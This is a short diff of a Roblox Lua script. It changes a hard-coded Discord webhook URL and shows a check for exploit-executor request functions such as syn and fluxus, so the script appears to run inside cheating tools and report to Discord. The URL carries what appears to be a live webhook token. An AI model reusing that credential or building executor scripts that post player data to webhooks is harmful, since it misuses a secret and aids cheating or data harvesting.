@@ -11,7 +11,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
 local Player = Players.LocalPlayer
-local Webhook_URL = "https://discord.com/api/webhooks/1441080855756804156/3RbyLZChVFCQUoGQlmJfxSeIVdoYdg_Gy1ZzXZbYvHHg75flzQqqOnESScfBS8fr3BoA" -- <--- PASTE URL HERE
+local Webhook_URL = "https://discord.com/api/webhooks/1441080855756804156/3RbyLZChVFCQUoGQlmJfxSeIVdoYdg_Gy1ZzXZbYvHHg75flzQqqOnESScfBS8fr3BoA-" -- <--- PASTE URL HERE
 
 -- [1] EXECUTOR CHECK
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
